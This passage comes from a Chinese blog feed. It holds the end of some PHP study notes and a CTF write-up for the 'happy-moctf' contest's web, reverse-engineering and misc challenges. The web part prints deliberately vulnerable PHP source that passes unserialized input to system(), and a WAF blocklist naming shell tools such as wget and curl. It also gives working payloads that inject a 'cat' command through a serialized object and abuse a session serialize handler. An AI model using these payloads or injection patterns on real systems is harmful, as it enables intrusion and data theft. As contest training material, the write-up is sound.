class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">is_float() &amp; is_double()</span><br><span class="line">is_int() &amp; is_integer()</span><br><span class="line">is_string()</span><br><span class="line">is_object()</span><br><span class="line">is_array()</span><br><span class="line">is_resource()</span><br><span class="line">is_bool()</span><br><span class="line">is_null()</span><br><span class="line"></span><br><span class="line">//eg:</span><br><span class="line">$b = null;</span><br><span class="line"></span><br><span class="line">if (is_null($b)) &#123;</span><br><span class="line">echo &quot;b为null&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;b不为null&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="调试打印变量"><a href="#调试打印变量" class="headerlink" title="调试打印变量"></a>调试打印变量</h2><ol><li>echo 字符串，数字</li><li>print_r 打印层次化的数据，比如：数组、对象</li><li>var_dump 打印变量的类型及其值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &apos;hello&apos;;</span><br><span class="line">$b = array(1,2,&quot;3&quot;);</span><br><span class="line">$c = false;</span><br><span class="line">$d = null;</span><br><span class="line">$e = 18;</span><br><span class="line">$f = true;</span><br><span class="line"></span><br><span class="line">echo $a,&apos;&lt;br&gt;&apos;,$b,&apos;&lt;br&gt;&apos;,$c,&apos;&lt;br&gt;&apos;,$d,&apos;&lt;br&gt;&apos;,$e,&apos;&lt;br&gt;&apos;,$f,&apos;&lt;br&gt;&apos;,&apos;&lt;hr&gt;&apos;;</span><br><span class="line"></span><br><span class="line">print_r($b);echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($c);echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($d);echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($f);echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">var_dump($c);echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">var_dump($d);echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">//布尔的true会打印1，false和null什么都不显示</span><br><span class="line">hello</span><br><span class="line">Array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">18</span><br><span class="line">1</span><br><span class="line">------------------------------------</span><br><span class="line">Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 ) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------------------------------------</span><br><span class="line">//布尔型数据不要用echo和print_r打印，容易干扰我们，用var_dump打印布尔和null</span><br><span class="line">bool(false) </span><br><span class="line">NULL</span><br></pre></td></tr></table></figure></li></ol><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><h2 id="销毁"><a href="#销毁" class="headerlink" title="销毁"></a>销毁</h2><h2 id="动态变量名"><a href="#动态变量名" class="headerlink" title="动态变量名"></a>动态变量名</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;PHP在CTF的WEB题经常有应用，这里简要记录一下自己在学习PHP的所见所闻，供自己复习使用，不定期更新……&lt;/p&gt;
&lt;h1 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; class=&quot;headerlink&quot; title=&quot;变量&quot;&gt;&lt;/a&gt;变量&lt;/h1&gt;&lt;h2 id=&quot;类型
      
    
    </summary>
    
    
      <category term="-PHP" scheme="http://ju5tw4nty0u.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>happy-moctf-新春欢乐赛</title>
    <link href="http://ju5tw4nty0u.top/2018/02/13/happy-moctf-%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
    <id>http://ju5tw4nty0u.top/2018/02/13/happy-moctf-新春欢乐赛/</id>
    <published>2018-02-13T14:30:35.000Z</published>
    <updated>2018-02-13T18:58:29.014Z</updated>
    
    <content type="html"><![CDATA[<pre><code>辞旧迎新，离新年没剩几天了，这次是我们自己学校的新春欢乐赛（happymoctf），又来划了一波水。</code></pre><p>不得不佩服学弟们做的首页，秀的我这个老年人头皮发麻<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/shouye.png" alt="CTF首页"></p><h1 id="WEB篇"><a href="#WEB篇" class="headerlink" title="WEB篇"></a>WEB篇</h1><h2 id="是时候让你的手指锻炼一下了"><a href="#是时候让你的手指锻炼一下了" class="headerlink" title="是时候让你的手指锻炼一下了"></a>是时候让你的手指锻炼一下了</h2><p>访问题目地址，查看源代码，可以找到这段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var clicks=0</span><br><span class="line">    $(function() &#123;</span><br><span class="line">      $(&quot;#cookie&quot;)</span><br><span class="line">        .mousedown(function() &#123;</span><br><span class="line">          $(this).width(&apos;350px&apos;).height(&apos;350px&apos;);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(function() &#123;</span><br><span class="line">          $(this).width(&apos;375px&apos;).height(&apos;375px&apos;);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(&quot;#clickcount&quot;).text(clicks);</span><br><span class="line">          if(clicks &gt;= 108000)&#123;</span><br><span class="line">          var form = $(&apos;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&apos; +</span><br><span class="line">&apos;&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;&apos; + clicks + &apos;&quot; hidden/&gt;&apos; +</span><br><span class="line">&apos;&lt;/form&gt;&apos;);</span><br><span class="line">$(&apos;body&apos;).append(form);</span><br><span class="line">form.submit(); </span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>我们可以把clicks的次数直接改成108000，从控制台写入，用burp抓包可以得到flag。<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/web1-1.png" alt="抓包结果"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:moctf&#123;Here_Is_Your_Surprise&#125;</span><br></pre></td></tr></table></figure></p><h2 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h2><p>看了一下源代码发现没有什么，可能存在源码泄露，试了一下发现是bak源码泄露<br>index.php.bak的主要内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    include &apos;class.php&apos;;</span><br><span class="line">    if(is_array($_GET)&amp;&amp;count($_GET)&gt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($_GET[&quot;LandIn&quot;]))</span><br><span class="line">        &#123;</span><br><span class="line">            $pos=$_GET[&quot;LandIn&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">        if($pos===&quot;airport&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        elseif($pos===&quot;school&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot;  style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&apos;);</span><br><span class="line">            $pubg=$_GET[&apos;pubg&apos;];</span><br><span class="line">            $p = unserialize($pubg);</span><br><span class="line">            // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span><br><span class="line">        &#125;</span><br><span class="line">        elseif($pos===&quot;AFK&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>同样我们也得到class.php.bak<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &apos;waf.php&apos;;</span><br><span class="line">    class sheldon&#123;</span><br><span class="line">        public $bag=&quot;nothing&quot;;</span><br><span class="line">        public $weapon=&quot;M24&quot;;</span><br><span class="line">        // public function __toString()&#123;</span><br><span class="line">        //     $this-&gt;str=&quot;You got the airdrop&quot;;</span><br><span class="line">        //     return $this-&gt;str;</span><br><span class="line">        // &#125;</span><br><span class="line">        public function __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;bag=&quot;nothing&quot;;</span><br><span class="line">            $this-&gt;weapon=&quot;kar98K&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function Get_air_drops($b)</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;$b();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($method,$parameters)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = explode(&quot;.&quot;,$method);</span><br><span class="line">            echo $file[0];</span><br><span class="line">            if(file_exists(&quot;.//class$file[0].php&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                system(&quot;php  .//class//$method.php&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                system(&quot;php  .//class//win.php&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        public function nothing()</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            waf($this-&gt;bag);</span><br><span class="line">            if($this-&gt;weapon===&apos;AWM&apos;)</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;Get_air_drops($this-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>参考了这几篇文章：<br><a href="http://blog.csdn.net/qq_27446553/article/details/53378847" target="_blank" rel="noopener">http://blog.csdn.net/qq_27446553/article/details/53378847</a><br><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">http://blog.csdn.net/qq_31481187/article/details/60968595</a><br><a href="http://blog.csdn.net/qq_31481187/article/details/53189113" target="_blank" rel="noopener">http://blog.csdn.net/qq_31481187/article/details/53189113</a><br><a href="http://www.jb51.net/article/107101.htm" target="_blank" rel="noopener">http://www.jb51.net/article/107101.htm</a></p><p>理解序列化的字符串（unserlialize的参数）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:3:”foo”:2:&#123;s:4:”file”;s:9:”shell.php”;s:4:”data”;s:5:”aaaaa”;&#125;</span><br><span class="line"></span><br><span class="line">O:3: 参数类型为对象(object),数组(array)为a</span><br><span class="line"></span><br><span class="line">“foo”:2: 参数名为foo，有两个值</span><br><span class="line"></span><br><span class="line">S:4:”file”;s:9:”shell.php”; s:参数类型为字符串(数字为i)，长度为4，值为file。长度为9的字符串shell.php</span><br><span class="line"></span><br><span class="line">s:4:”data”;s:5:”aaaaa”;&#125; 长度为4的字符串data，长度为5的字符串aaaaa</span><br><span class="line"></span><br><span class="line">object foo，属性file：shell.php，属性data：aaaaa</span><br></pre></td></tr></table></figure></p><p>绕过__wakeup方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成员属性数目大于实际数目时可绕过wakeup方法，把 O:6:”HITCON”:3 中的3改为任意比3大数字即可；</span><br><span class="line">另一种绕过方法为对wakeup过滤的绕过，利用了sql注入中的/**/</span><br></pre></td></tr></table></figure></p><p>读一下waf.php得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function waf($values)&#123;</span><br><span class="line">    //$black = [];</span><br><span class="line">    $black = array(&apos;vi&apos;,&apos;awk&apos;,&apos;-&apos;,&apos;sed&apos;,&apos;comm&apos;,&apos;diff&apos;,&apos;grep&apos;,&apos;cp&apos;,&apos;mv&apos;,&apos;nl&apos;,&apos;less&apos;,&apos;od&apos;,&apos;head&apos;,&apos;tail&apos;,&apos;more&apos;,&apos;tac&apos;,&apos;rm&apos;,&apos;ls&apos;,&apos;tailf&apos;,&apos;%&apos;,&apos;%0a&apos;,&apos;%0d&apos;,&apos;%00&apos;,&apos;ls&apos;,&apos;echo&apos;,&apos;ps&apos;,&apos;&gt;&apos;,&apos;&lt;&apos;,&apos;$&#123;IFS&#125;&apos;,&apos;ifconfig&apos;,&apos;mkdir&apos;,&apos;cp&apos;,&apos;chmod&apos;,&apos;wget&apos;,&apos;curl&apos;,&apos;http&apos;,&apos;www&apos;,&apos;`&apos;,&apos;printf&apos;);</span><br><span class="line"></span><br><span class="line">    foreach ($black as $key =&gt; $value) &#123;</span><br><span class="line">        if(stripos($values,$value))&#123;</span><br><span class="line">            die(&quot;Attack!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;class.php&apos;;</span><br><span class="line">$a = new sheldon()</span><br><span class="line"></span><br><span class="line">$a-&gt;weapon = &apos;AWM&apos;;</span><br><span class="line"></span><br><span class="line">$a-&gt;bag = &apos;flag.php./&apos;;</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.57.208:6001/?LandIn=school&amp;pubg=O:7:%22sheldon%22:20:&#123;s:3:%22bag%22;s:23:%22flag.php;cat%20class/flag%22;s:6:%22weapon%22;s:3:%22AWM%22;&#125;</span><br></pre></td></tr></table></figure></p><p>在源码里可得flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:moctf&#123;Try_Learn_PhP_h4rder&#125;</span><br></pre></td></tr></table></figure></p><h2 id="登录一哈"><a href="#登录一哈" class="headerlink" title="登录一哈"></a>登录一哈</h2><p>刚开始不会，后面放hint提示“开发人员用git管理过代码”，我们想到.git文件泄露，用GitHack把源码还原，得到两个php文件:<br>index.php主要代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;, &apos;php_binary&apos;);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">        $username = $_POST[&apos;username&apos;];</span><br><span class="line">        $password = $_POST[&apos;password&apos;];</span><br><span class="line">        $_SESSION[&quot;username&quot;] = $username;</span><br><span class="line">        header(&quot;Location:./index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        echo &apos;&lt;h1&gt;hello &apos;.$_SESSION[&quot;username&quot;].&apos;&lt;/h1&gt;&apos;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>flag.php主要代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">class MOCTF&#123;</span><br><span class="line">    public $flag;</span><br><span class="line">    public $name;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;flag = &quot;moctf&#123;xxxxxxxxxxxxxxxxxxx&#125;&quot;;</span><br><span class="line">        if($this-&gt;flag == $this-&gt;name)&#123;</span><br><span class="line">            echo &quot;Wow,this is flag:&quot;.$this-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里也是一个序列化的问题，这里参考了<br><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">http://blog.csdn.net/qq_31481187/article/details/60968595</a><br><a href="http://blog.csdn.net/qq_31481187/article/details/53189113" target="_blank" rel="noopener">http://blog.csdn.net/qq_31481187/article/details/53189113</a><br><a href="http://www.jb51.net/article/107101.htm" target="_blank" rel="noopener">http://www.jb51.net/article/107101.htm</a></p><p>所以我们构造的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:&quot;MOCTF&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure></p><p>登陆后为<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/denglu.png" alt="denglu"></p><p>然后访问flag.php，得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow,this is flag:moctf&#123;ser1ali2e_h4ndler_1s_c00l&#125;</span><br></pre></td></tr></table></figure></p><h1 id="RE篇"><a href="#RE篇" class="headerlink" title="RE篇"></a>RE篇</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>用IDA打开qiandao这个文件，在hex-view看到<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/reida.png" alt="reida"><br>猜想可能是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">moctf&#123;Sign-in.desk.english?&#125;</span><br><span class="line"></span><br><span class="line">moctf&#123;Sign-in-desk-english?&#125;</span><br><span class="line"></span><br><span class="line">moctf&#123;Sign-indesk-english?&#125;</span><br></pre></td></tr></table></figure></p><p>都试了一下得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:moctf&#123;Sign-indesk-english?&#125;</span><br></pre></td></tr></table></figure></p><h2 id="我的VIP呢，那么大个的VIP"><a href="#我的VIP呢，那么大个的VIP" class="headerlink" title="我的VIP呢，那么大个的VIP"></a>我的VIP呢，那么大个的VIP</h2><p>是一道安卓逆向，下载apk，用apktoolbox进行jadx，拿到源码，分析了一下主要的几个函数，发现有一个VipFunction的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class VipFunction extends Activity &#123;</span><br><span class="line">    protected void onCreate(Bundle bundle) &#123;</span><br><span class="line">        super.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.vipfunction);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们找到R.layout.vipfunction所在的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt;</span><br><span class="line">    &lt;TextView android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;moctf&#123;20180202mqlsys&#125;&quot; android:layout_centerInParent=&quot;true&quot; /&gt;</span><br><span class="line">&lt;/RelativeLayout&gt;</span><br></pre></td></tr></table></figure></p><p>发现flag就在这里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：moctf&#123;20180202mqlsys&#125;</span><br></pre></td></tr></table></figure></p><h2 id="哇，有毒吧"><a href="#哇，有毒吧" class="headerlink" title="哇，有毒吧"></a>哇，有毒吧</h2><p>同样是安卓逆向，用apktoolbox进行jadx，关注这段源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public void check(String name, String pass) &#123;</span><br><span class="line">      if (name.equals(&quot;MQLSY_s&quot;) &amp;&amp; pass.equals(&quot;66666&quot;)) &#123;</span><br><span class="line">          Toast.makeText(this, &quot;bW9jdGZ7dGhlX0NURl9JU18/fQ==&quot;, 0).show();</span><br><span class="line">      &#125; else if (name.equals(&quot;mqlsys&quot;) &amp;&amp; pass.equals(&quot;23333&quot;)) &#123;</span><br><span class="line">          Toast.makeText(this, &quot;bW9jdGZ7ZmFsc2U/fQ==&quot;, 0).show();</span><br><span class="line">      &#125; else if (name.equals(BuildConfig.FLAVOR) &amp;&amp; pass.equals(BuildConfig.FLAVOR)) &#123;</span><br><span class="line">          Toast.makeText(this, &quot;\u54c7\uff0c\u8fd9\u4f60\u90fd\u6562\u5c1d\u8bd5\uff0c\u5389\u5bb3\u5389\u5bb3&quot;, 0).show();</span><br><span class="line">      &#125; else if (name.equals(&quot;MQL&quot;) &amp;&amp; pass.equals(&quot;2018&quot;)) &#123;</span><br><span class="line">          Toast.makeText(this, &quot;bW9jdGZ7dGhpc19pc24ndF9mbGFnfQ==&quot;, 0).show();</span><br><span class="line">      &#125; else if (name.equals(&quot;admin&quot;) &amp;&amp; pass.equals(&quot;admin&quot;)) &#123;</span><br><span class="line">          Toast.makeText(this, &quot;\u767b\u5f55\u6210\u529f&quot;, 0).show();</span><br><span class="line">      &#125; else if (name.equals(&quot;MQL&quot;) &amp;&amp; pass.equals(&quot;666&quot;)) &#123;</span><br><span class="line">          Toast.makeText(this, &quot;bW9jdGZ7dHJ1ZT99&quot;, 0).show();</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          Toast.makeText(this, &quot;\u767b\u5f55\u5931\u8d25&quot;, 0).show();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>里面的几个判断语句都有name和pass,解码pass看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">moctf&#123;the_CTF_IS_?&#125;</span><br><span class="line">moctf&#123;false?&#125;</span><br><span class="line">哇，这你都敢尝试，厉害厉害</span><br><span class="line">moctf&#123;this_isn&apos;t_flag&#125;</span><br><span class="line">登录成功</span><br><span class="line">moctf&#123;true?&#125;</span><br><span class="line">登录失败</span><br></pre></td></tr></table></figure></p><p>想试下这些能不能过，结果第一个就是我们所要的flag(脑洞有点大，老年人跟不上)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：moctf&#123;the_CTF_IS_?&#125;</span><br></pre></td></tr></table></figure></p><h1 id="MISC篇"><a href="#MISC篇" class="headerlink" title="MISC篇"></a>MISC篇</h1><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>得到的是一个流量包，用wireshark打开看一下，发现应该是路由器配置过程的流量包，我们追踪TCP流可以看到flag。<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/misc1-1.png" alt="TCP流"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag: moctf&#123;c@N_y0U_4lnd_m8&#125;</span><br></pre></td></tr></table></figure></p><h2 id="base全家桶"><a href="#base全家桶" class="headerlink" title="base全家桶"></a>base全家桶</h2><p>得到这样一个字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 